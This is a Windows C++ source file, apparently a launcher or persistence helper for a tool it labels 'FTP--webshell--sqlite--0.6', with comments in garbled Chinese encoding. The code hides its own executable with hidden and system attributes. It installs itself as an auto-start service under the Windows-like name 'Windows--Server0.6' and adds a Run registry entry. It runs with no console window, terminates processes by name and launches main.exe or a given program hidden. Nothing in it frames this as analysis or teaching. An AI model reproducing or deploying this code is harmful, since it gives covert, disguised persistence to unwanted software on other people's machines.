// close_open.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "close_open.h"
#include<windows.h>
#include <Wininet.h>
#include <TLHELP32.H>
//#include <afx.h>
#include <afxtempl.h>
#include <vector>
using namespace std;
#include <iostream>   

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// The one and only application object

CWinApp theApp;

using namespace std;

int close_exe(CString strProcessName)
{
		BOOL bResult;
	CString strTemp;
	HANDLE hSnapshot;				//�ڴ���̵ġ����ա����   
	PROCESSENTRY32 ProcessEntry;	//�������̵Ľṹ   ����ṹ��Ҫ#include <TLHELP32.H>ͷ�ļ�
	vector<DWORD> vtPID;			//����ID����
	//����Ҫ�����Ľ�������
//strProcessName="main.exe";
//GetDlgItem(IDC_EDIT1)->GetWindowText(strProcessName);//��ȡ�ı�������Ľ�����
	
//MessageBox(strProcessName);
	strProcessName.MakeLower();
	//�����ڴ����н��̵Ŀ��ա�����ΪTH32CS_SNAPPROCESSȡ�еĽ���,���Բ���2��
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//��ȡҪ�����Ľ������ƶ�Ӧ�����н���ID
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	bResult = Process32First(hSnapshot,&ProcessEntry);//��ȡ��һ������
	while(bResult)
	{
		//�ж��Ƿ�ΪҪ�����Ľ���
		strTemp.Format("%s",ProcessEntry.szExeFile);
		strTemp.MakeLower();
		//		MessageBox(strTemp);
		if(strTemp==strProcessName)
			vtPID.push_back(ProcessEntry.th32ProcessID);
		//��ȡ��һ������
		bResult = Process32Next(hSnapshot,&ProcessEntry);
	}
	//��������
	bResult = FALSE;
	vector<DWORD>::iterator it = vtPID.begin();
	for(;it!=vtPID.end();++it)
	{
		if(*it)
		{
			//��ȡ���̾��
			HANDLE hProcess;
			hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,*it);
			//��������
			if(hProcess)
				bResult = TerminateProcess(hProcess,0);
			if(!bResult)
				break;
		}
	}
	
	//
	if(bResult)
		return 1;  //�����ɹ�
	else
		return 0;  //����ʧ��
}


#include "winsvc.h"
void AddServices(char *m_ServiceName, char *m_DisplayName, char *m_Description)   //��ӷ���
{    //AddServices("������" ,"��������", "��������");  
	char FilePath[MAX_PATH];
//	char SystemPath[MAX_PATH];
	GetModuleFileName(NULL,FilePath,MAX_PATH);   //GetModuleFileNameȡ��Ӧ������·��
//	GetSystemDirectory(SystemPath,MAX_PATH);   //ȡ��SystemĿ¼����·���� 
// 	if (strncmp(SystemPath,FilePath,strlen(SystemPath)) != 0)
// 	{
// 		char FileTitle[80];
// 		GetFileTitle(FilePath,FileTitle,80);
// 		if (strstr(FileTitle,".exe") == NULL && strstr(FileTitle,".EXE") == NULL)
// 			strcat(FileTitle,".exe");
// 		strcat(SystemPath,"\\");
// 		strcat(SystemPath,FileTitle);
// 		CopyFile(FilePath,SystemPath,FALSE);
// 		memset(FilePath,0,MAX_PATH);
// 		strcpy(FilePath,SystemPath);   //strcpy�����ַ���
// 	}
	SetFileAttributes (FilePath,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);  //�����ļ�����
	
    SC_HANDLE manager=NULL;
    SC_HANDLE service=NULL;
	char Desc[MAX_PATH];
	HKEY key=NULL;
    manager = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);  //SC_MANAGER_ALL_ACCESS ����Ȩ��
    service=CreateService( manager,m_ServiceName,m_DisplayName,    //�������
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, 
		SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, 
		FilePath, 0, 0, 0, 0, 0 );
	
	strcpy(Desc,"SYSTEM\\CurrentControlSet\\Services\\");   //ϵͳ����λ��
	strcat(Desc,m_ServiceName);    //�ϲ��ַ���
	RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);  //��ע�����
	RegSetValueEx(key,"Description",0,REG_SZ,(CONST BYTE*)m_Description,lstrlen(m_Description));   //��ӷ�������
	
	StartService(service,0,NULL);	//��������
	RegCloseKey(key);     //�ر�ע�����
    CloseServiceHandle(service);
    CloseServiceHandle(manager);
	return; 
}

BOOL BOOL_exe(CString strProcessName)  //�жϽ����Ƿ����
{
	BOOL bResult;
	CString strTemp;
	HANDLE hSnapshot;				//�ڴ���̵ġ����ա����   
	PROCESSENTRY32 ProcessEntry;	//�������̵Ľṹ   ����ṹ��Ҫ#include <TLHELP32.H>ͷ�ļ�
	vector<DWORD> vtPID;			//����ID����
	//����Ҫ�����Ľ�������
//strProcessName="main.exe";
//GetDlgItem(IDC_EDIT1)->GetWindowText(strProcessName);//��ȡ�ı�������Ľ�����
	
//MessageBox(strProcessName);
	strProcessName.MakeLower();
	//�����ڴ����н��̵Ŀ��ա�����ΪTH32CS_SNAPPROCESSȡ�еĽ���,���Բ���2��
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	//��ȡҪ�����Ľ������ƶ�Ӧ�����н���ID
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	bResult = Process32First(hSnapshot,&ProcessEntry);//��ȡ��һ������
	while(bResult)
	{
		//�ж��Ƿ�ΪҪ�����Ľ���
		strTemp.Format("%s",ProcessEntry.szExeFile);
		strTemp.MakeLower();
		//MessageBox(strTemp);
		
		if(strTemp==strProcessName){
			vtPID.push_back(ProcessEntry.th32ProcessID);
			   //���̴���
			return true;
		}
		//��ȡ��һ������
		bResult = Process32Next(hSnapshot,&ProcessEntry);
	}
	return false;  //���̲�����

}

void RegMe(void)  //ע�������
{
 	char FilePath[MAX_PATH];
 	GetModuleFileName(NULL,FilePath,MAX_PATH);   //GetModuleFileNameȡ��Ӧ������·��
	CString	lpValue;  //����
	lpValue.Format("%s",FilePath);
	HKEY hkey=HKEY_LOCAL_MACHINE;   //����
	char lpSubKey[256]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";   //�Ӽ�
	HKEY phkResult;
     
    int len=sizeof(lpValue);  //����
	
	if(::RegOpenKeyEx(hkey,lpSubKey,0,KEY_ALL_ACCESS,&phkResult)!=ERROR_SUCCESS)  //�ж��Ƿ��
	{
		::RegCreateKeyEx(hkey,lpSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_SET_VALUE|KEY_CREATE_SUB_KEY|KEY_WRITE,NULL,&phkResult,NULL);  //������  ӦΪ�ϱ�û�д򿪳ɹ�
	}
	//���������ֵ�����½�
	if (RegQueryValueEx(hkey,lpSubKey,NULL,NULL,(unsigned char *)&lpValue,(unsigned long *)&len)!=ERROR_SUCCESS)   //�жϼ�ֵ�Ƿ����
	::RegSetValueEx(phkResult,"FTP--webshell--sqlite--0.6",0,REG_SZ,(BYTE*)lpValue.GetBuffer(0),lpValue.GetLength());  //д��ע�������
	::RegCloseKey(phkResult);  //�ͷ�ָ��ע����ľ��  
}

#pragma   comment(linker,   "/subsystem:\"windows\"   /entry:\"mainCRTStartup\""   )
//��Ҫд����̨����������.�ڿ���̨���������ؿ���̨����!

int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	RegMe();  //ע�������
	AddServices("ftp--Server0.6" ,"Windows--Server0.6", "FTP--webshell--sqlite--0.6");  
	if(argv[1]==NULL)
	{
		if (BOOL_exe("main.exe"))    //�жϽ����Ƿ����
		{
			//MessageBox("���̴���","1111",MB_OK);
			RegMe();  //ע�������
			AddServices("ftp--Server0.6" ,"Windows--Server0.6", "FTP--webshell--sqlite--0.6");  
		} 
		else
		{
			ShellExecute(NULL,"open","main.exe",NULL,NULL,SW_HIDE);
			//MessageBox("���̲�����","1111",MB_OK);
		}
		

	}
	if(argv[1]!=NULL)
	{
		CString   str;   
		str.Format("��ʼ�������̣�%s\n",argv[1]);
		printf (str);
		if(close_exe(argv[1]))
		{
			printf ("�������̳ɹ��ȴ�10�������������\n");
			_sleep(10*1000); //��ʱ5�� 
			//MessageBox(NULL,"text","�������̳ɹ���",MB_OK);
			//_sleep(60*1000); //��ʱ60�� 
			if(argv[2]!=NULL)
				ShellExecute( 0,"open",argv[2],NULL,NULL,SW_HIDE);
				//ShellExecute( 0,"open",argv[2],NULL,NULL,SW_SHOWMAXIMIZED);
		}
		else
			//MessageBox(NULL,"text","��������ʧ�ܣ�",MB_OK);
			printf ("��������ʧ�ܣ�\n");
	}
}


